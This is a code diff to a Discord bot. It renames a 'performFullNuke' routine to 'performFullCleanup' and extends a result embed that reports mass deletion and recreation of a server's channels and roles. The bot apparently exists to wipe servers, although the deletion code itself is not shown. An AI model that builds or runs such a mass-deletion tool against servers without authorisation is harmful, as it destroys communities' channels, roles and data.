@@ -6,7 +6,7 @@ import {
 } from 'discord.js';
 import config from '../config.js';
 import logger from '../utils/logger.js';
-import { performFullNuke } from '../utils/nuke.js';
+import { performFullCleanup } from '../utils/cleanup.js';
 
 const activeOperations = new Map();
 
@@ -207,7 +207,7 @@ async function handleTimeout(message, userId, guildId) {
 
 async function executeSyednukeallAsync(message, guild, userId, guildId) {
   // Fire and forget - do not await
-  performFullNuke(guild, userId, guildId)
+  performFullCleanup(guild)
     .then(async (results) => {
       try {
         const resultEmbed = new EmbedBuilder()
@@ -217,8 +217,10 @@ async function executeSyednukeallAsync(message, guild, userId, guildId) {
           .addFields(
             { name: 'Channels Deleted', value: `${results.channels.success}`, inline: true },
             { name: 'Channels Failed', value: `${results.channels.failed}`, inline: true },
+            { name: 'Channels Created', value: `${results.channelsCreated.success}`, inline: true },
             { name: 'Roles Deleted', value: `${results.roles.success}`, inline: true },
             { name: 'Roles Failed', value: `${results.roles.failed}`, inline: true },
+            { name: 'Roles Created', value: `${results.rolesCreated.success}`, inline: true },
             { name: 'Duration', value: `${results.duration}ms`, inline: false }
           )
           .setFooter({ text: `Executed by: ${userId}` })
